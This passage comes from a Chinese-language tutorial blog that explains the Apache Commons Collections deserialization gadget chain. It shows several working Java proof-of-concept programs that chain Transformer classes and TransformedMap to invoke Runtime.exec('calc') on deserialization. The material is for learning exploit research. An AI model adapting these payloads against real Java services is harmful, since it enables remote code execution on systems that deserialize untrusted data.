}</span><br></pre></td></tr></tbody></table></figure>

<p>它循环遍历了<code>iTransformers</code>数组中的每一个元素，每一次循环，它都会把<code>该元素.transform(object)</code>的结果（一个对象）赋值给<code>object</code>，并返回。这意味着，下一个元素执行的<code>transform()</code>方法中的参数就是上一个元素执行<code>transform()</code>方法的返回值，如此一来就是串行传递执行结果。</p>
<p>我们需要确定<code>iTransfomers</code>这个数组中的内容是否是我们可以自主控制的，定位到其构造函数中看看这个成员变量的来历：</p>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ChainedTransformer</span><span class="params">(Transformer[] transformers)</span> {</span><br><span class="line">    <span class="built_in">this</span>.iTransformers = transformers;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>显然我们是可以自定义该变量的内容的，又因为之前我们看到，<code>InvokerTransformer</code>不仅<code>implements</code>了<code>Serializa</code>接口，也<code>implements</code>了<code>Transformer</code>接口，那么<code>InvokerTransformer</code>的实例对象也是可以放在这个<code>iTransfomers</code>这个数组中的(不明白的去巩固巩固java基础)</p>
<p>所有就有下面的想法：让我们构造的<code>input</code>(Runtime实例)作为第一个遍历元素的返回值，再执行第二个元素的transform时，刚好就传入了input这个参数了。</p>
<p>但问题是，怎么让我们构造的<code>input</code>(Runtime实例)能被<code>Transformer</code>类或其子类的<code>transform()</code>方法中的返回呢？接下来就引入<code>ConstantTransformer</code>类</p>
<h3 id="3-ConstantTransformer-类"><a href="#3-ConstantTransformer-类" class="headerlink" title="3. ConstantTransformer 类"></a>3. ConstantTransformer 类</h3><p>该类也位于<code>org.apache.commons.collections.functors</code>包中,它同样也<code>implements</code>了<code>Transformer</code>类的，所以可以被放进<code>Transformer[]</code>数组，同样也有我们想要的<code>transform()</code>方法。顾名思义，该类其实只会存放一个常量；它的构造函数会写入这个变量，它的transform函数又会返回这个变量,其中构造函数和transform方法的源码如下：</p>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ConstantTransformer</span><span class="params">(Object constantToReturn)</span> {</span><br><span class="line">        <span class="built_in">this</span>.iConstant = constantToReturn;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> {</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.iConstant;</span><br><span class="line">    }</span><br></pre></td></tr></tbody></table></figure>

<p>我们可以在构造函数中将<code>Runtime.getRuntime()</code>得到的Runtime实例传给iConstant,这样链就连起来了：</p>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Anchor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> {</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, IOException {</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 客户端构造payload，并序列化文件</span></span><br><span class="line"><span class="comment">         * */</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]{</span><br><span class="line">                <span class="comment">//返回input(即Runtime实例)，并将它作为下面的transform()的方法参数传入</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.getRuntime()),</span><br><span class="line">                <span class="comment">//创建invokerTransformer，并利用构造方法对iMethodName、iParamTypes、iArgs进行赋值</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">"exec"</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]{String.class}, <span class="keyword">new</span> <span class="title class_">String</span>[]{<span class="string">"calc"</span>})</span><br><span class="line">        };</span><br><span class="line">        <span class="comment">//将上面的数组用chainedTransformer串起来，数组里的transformer会被挨个执行transform()方法</span></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="comment">//序列化</span></span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">"payload.bin"</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(chainedTransformer);</span><br><span class="line">        objectOutputStream.flush();</span><br><span class="line">        objectOutputStream.close();</span><br><span class="line">        fileOutputStream.close();</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 服务端反序列化读取，并触发漏洞</span></span><br><span class="line"><span class="comment">         * */</span></span><br><span class="line">        <span class="comment">//反序列化</span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">"payload.bin"</span>);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">inv</span> <span class="operator">=</span> (ChainedTransformer) objectInputStream.readObject();</span><br><span class="line">        <span class="comment">//触发漏洞</span></span><br><span class="line">        inv.transform(<span class="string">"Anchor"</span>);<span class="comment">//这里任何值都可以,因为ConstantTransformer.transform(object)中的object中没有被用到</span></span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>该程序运行后直接报错，产生以下错误：</p>
<p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/image-20240121151826101.png" alt="NotSerializableException"></p>
<p>也就是说，Runtime类是不可以序列化的，我们看它的源码可以发现并没有实现<code>Serializa</code>接口，而我们是直接将通过<code>Runtime.getRuntime()</code>得到的Runtime实例序列化，所以产生错误。</p>
<p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/image-20240121152106929.png" alt="Runtime部分源码"></p>
<p>那么就另辟蹊径，我们通过反射方式获取Runtime实例，让服务端在反序列化时自己生成Runtime实例：</p>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Anchor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> {</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, IOException {</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 客户端构造payload，并序列化文件</span></span><br><span class="line"><span class="comment">         * */</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]{</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),<span class="comment">//返回Runtime Class</span></span><br><span class="line">                <span class="comment">//获取getRuntime方法</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">"getDeclaredMethod"</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]{String.class,Class[].class}, <span class="keyword">new</span> <span class="title class_">Object</span>[]{<span class="string">"getRuntime"</span>,<span class="literal">null</span>}),</span><br><span class="line">                <span class="comment">//call getRuntime方法得到Runtime实例</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">"invoke"</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]{Object.class,Object[].class}, <span class="keyword">new</span> <span class="title class_">Object</span>[]{<span class="literal">null</span>,<span class="literal">null</span>}),</span><br><span class="line">                <span class="comment">//创建invokerTransformer，并利用构造方法对iMethodName、iParamTypes、iArgs进行赋值</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">"exec"</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]{String.class}, <span class="keyword">new</span> <span class="title class_">String</span>[]{<span class="string">"calc"</span>})</span><br><span class="line">        };</span><br><span class="line">        <span class="comment">//将上面的数组用chainedTransformer串起来，数组里的transformer会被挨个执行transform()方法</span></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="comment">//序列化</span></span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">"payload.bin"</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(chainedTransformer);</span><br><span class="line">        objectOutputStream.flush();</span><br><span class="line">        objectOutputStream.close();</span><br><span class="line">        fileOutputStream.close();</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 服务端反序列化读取，并触发漏洞</span></span><br><span class="line"><span class="comment">         * */</span></span><br><span class="line">        <span class="comment">//反序列化</span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">"payload.bin"</span>);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">inv</span> <span class="operator">=</span> (ChainedTransformer) objectInputStream.readObject();</span><br><span class="line">        <span class="comment">//触发漏洞</span></span><br><span class="line">        inv.transform(<span class="string">"Anchor"</span>);<span class="comment">//这里任何值都可以</span></span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>成功弹出计算器！</p>
<p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/image-20240121152737069.png" alt="成功弹出计算器"></p>
<p>看到这里我是真的很佩服构造这个利用链的大佬，能够构造地这么巧妙！</p>
<p>不过还没完，就这样漏洞触发的条件依旧苛刻，仍需要开发者在服务端将object转换为<code>ChainedTransformer</code>类型，且执行<code>transform</code>方法，我们还需要进一步扩大漏洞触发范围。</p>
<h3 id="4-TransformedMap类"><a href="#4-TransformedMap类" class="headerlink" title="4 TransformedMap类"></a>4 TransformedMap类</h3><p>前面也提到过该类，该类是对 Java 标准数据结构 <code>Map</code> 接口的一个扩展，该类位于<code>org.apache.commons.collections.map</code>包中</p>
<p>该类中我们可以看到以下方法：</p>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> Object <span class="title function_">transformKey</span><span class="params">(Object object)</span> {</span><br><span class="line">    <span class="comment">//若keyTransformer不为null，则执行其transform方法</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.keyTransformer == <span class="literal">null</span> ? object : <span class="built_in">this</span>.keyTransformer.transform(object);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> Object <span class="title function_">transformValue</span><span class="params">(Object object)</span> {</span><br><span class="line">    <span class="comment">//若valueTransformer不为null，则执行其transform方法</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.valueTransformer == <span class="literal">null</span> ? object : <span class="built_in">this</span>.valueTransformer.transform(object);</span><br><span class="line">}</span><br><span class="line"><span class="keyword">protected</span> Object <span class="title function_">checkSetValue</span><span class="params">(Object value)</span> {</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.valueTransformer.transform(value);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">put</span><span class="params">(Object key, Object value)</span> {</span><br><span class="line">        key = <span class="built_in">this</span>.transformKey(key);</span><br><span class="line">        value = <span class="built_in">this</span>.transformValue(value);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.getMap().put(key, value);</span><br><span class="line">    }</span><br></pre></td></tr></tbody></table></figure>

<h4 id="put"><a href="#put" class="headerlink" title="put()"></a>put()</h4><p>虽然前三个方法中都有我们想要的调用transform方法，但是由于属性均为protected，非子类的话，是无法被外界访问的。不过可以借助第四个方法————<code>put()</code>，该方法中就调用了前面两个方法，那也就可以间接调用transform方法了。</p>
<p>那么问题来了，其中的keyTransformer和valueTransformer是否是我们可控的？</p>
<p>还是一样的，跟进到构造函数中一探究竟。</p>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="title function_">TransformedMap</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> {</span><br><span class="line">        <span class="built_in">super</span>(map);</span><br><span class="line">        <span class="built_in">this</span>.keyTransformer = keyTransformer;</span><br><span class="line">        <span class="built_in">this</span>.valueTransformer = valueTransformer;</span><br><span class="line">    }</span><br></pre></td></tr></tbody></table></figure>

<p>我们可以看到，构造函数的属性也是<code>protected</code>，也就是说，在别的包中，我们是无法通过new来实例化一个TransformedMap类的对象的，那也就是说，无法通过该处构造函数实现传入构造的利用链了。那就没办法了不？</p>
<p>我们把目标锁定在另外的一个静态方法<code>decorate()</code>上：</p>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">decorate</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> {</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">TransformedMap</span>(map, keyTransformer, valueTransformer);</span><br><span class="line">    }</span><br></pre></td></tr></tbody></table></figure>

<p>可以看到该静态方法可以直接返回一个TransformedMap实例，并且该静态方法是<code>public</code>属性，那么问题迎刃而解了，我们可以<code>TransformedMap.decorate()</code>来获取一个<code>TransformedMap</code>实例，其中的keyTransformer或是valueTransformer参数处传入我们构造好几次的transformer链，那么接下来poc改造如下：</p>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Anchor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> {</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, IOException {</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 客户端构造payload，并序列化文件</span></span><br><span class="line"><span class="comment">         * */</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]{</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),<span class="comment">//返回Runtime Class</span></span><br><span class="line">                <span class="comment">//获取getRuntime方法</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">"getDeclaredMethod"</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]{String.class,Class[].class}, <span class="keyword">new</span> <span class="title class_">Object</span>[]{<span class="string">"getRuntime"</span>,<span class="literal">null</span>}),</span><br><span class="line">                <span class="comment">//call getRuntime方法得到Runtime实例</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">"invoke"</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]{Object.class,Object[].class}, <span class="keyword">new</span> <span class="title class_">Object</span>[]{<span class="literal">null</span>,<span class="literal">null</span>}),</span><br><span class="line">                <span class="comment">//创建invokerTransformer，并利用构造方法对iMethodName、iParamTypes、iArgs进行赋值</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">"exec"</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]{String.class}, <span class="keyword">new</span> <span class="title class_">String</span>[]{<span class="string">"calc"</span>})</span><br><span class="line">        };</span><br><span class="line"></span><br><span class="line">        <span class="comment">//将上面的数组用chainedTransformer串起来，数组里的transformer会被挨个执行transform()方法</span></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        map.put(<span class="string">"123"</span>,<span class="string">"456"</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">myMap</span> <span class="operator">=</span> TransformedMap.decorate(map, <span class="literal">null</span>, chainedTransformer);<span class="comment">//final malicious map</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//序列化</span></span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">"payload.bin"</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(myMap);</span><br><span class="line">        objectOutputStream.flush();</span><br><span class="line">        objectOutputStream.close();</span><br><span class="line">        fileOutputStream.close();</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 服务端反序列化读取，并触发漏洞</span></span><br><span class="line"><span class="comment">         * */</span></span><br><span class="line">        <span class="comment">//反序列化</span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">"payload.bin"</span>);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">mapObj</span> <span class="operator">=</span> (Map) objectInputStream.readObject();</span><br><span class="line">        <span class="comment">//触发漏洞</span></span><br><span class="line">        mapObj.put(<span class="string">"anchor"</span>,<span class="string">"anch0r"</span>);</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>nice，计算器还是照常弹出。</p>
<p>到了这一步，漏洞的范围就很大了，因为已经接触到我们常用的Map数据结构和其put()方法了。但这还是不太理想，我们更理想化的攻击方式是，服务器端只要反序列化<code>readObject()</code>就能触发反序列化漏洞。可惜的是，安全研究的大佬们发现并未有满足重写了<code>readObject()</code>方法且方法内可以调用<code>MapObj.put()</code>方法条件的Class。</p>
<h4 id="checkSetValue"><a href="#checkSetValue" class="headerlink" title="checkSetValue()"></a>checkSetValue()</h4><p>注意到上面这个poc只是利用了其中我提到的<code>transformKey</code>、 <code>transformValue</code>以及<code>put</code>方法，其中有个方法我还没提，就是<code>checkSetValue()</code>方法：</p>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> Object <span class="title function_">checkSetValue</span><span class="params">(Object value)</span> {</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.valueTransformer.transform(value);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>这里面也调用了我们想要的transform方法，但是该方法也是protected属性来修饰的，不能直接利用,我们可以看看其他有哪个地方调用了这个<code>checkSetValue</code>方法。该方法其实是由<code>TransformedMap</code>继承自<code>AbstractInputCheckedMapDecorator</code>类,我们就先跟进这个类中看看。</p>
<p>在该类中又有个<code>MapEntry</code>类，其中<code>setValue</code>方法中调用了checkSetValue方法。</p>
<p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/image-20240121162933292.png" alt="MapEntry类"></p>
<p>显然，现在我们只需要确保<code>this.parent</code>指向的是<code>TransformedMap</code>类的对象就可以了。那就继续看看<code>this.parent</code>在哪些地方被赋值了。、</p>
<p>可以看到分别可以在当前类文件的<code>EntrySetIterator</code>类和<code>EntrySet</code>类的构造函数中赋值：</p>
<p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/image-20240121163506413.png" alt="this.parent赋值的地方"></p>
<p>但这是<strong>不同</strong>Class的<code>parent</code>，我们需要的是<code>MapEntry</code>里的<code>parent</code>，继续查看代码，发现：<code>EntrySetIterator</code>中的next()方法会将自身的<code>parent</code>传入<code>MapEntry</code>，而<code>EntrySet</code>的<code>iterator</code>方法又会创建一个新的<code>EntrySetIterator</code>，将它的parent传入<code>EntrySetIterator</code>，这样就连起来了 <code>new EntrySet(set,parent).iterator().next()</code>就能够传入我们的parent：</p>
<p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/image-20240121163937101.png" alt="连起来了"></p>
<p>接着我们发现，<code>AbstractInputCheckedMapDecorator</code>里还有一个<code>entrySet()</code>，因为我们的<code>TransformedMap</code>就是它的子类，所以我们可以直接用我们的<code>TransformedMap</code>去调用这个方法,一切就连起来了。</p>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Set <span class="title function_">entrySet</span><span class="params">()</span> {</span><br><span class="line">    <span class="keyword">return</span> (Set)(<span class="built_in">this</span>.isSetValueChecking() ? <span class="keyword">new</span> <span class="title class_">EntrySet</span>(<span class="built_in">super</span>.map.entrySet(), <span class="built_in">this</span>) : <span class="built_in">super</span>.map.entrySet());</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>于是POC改造：</p>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span 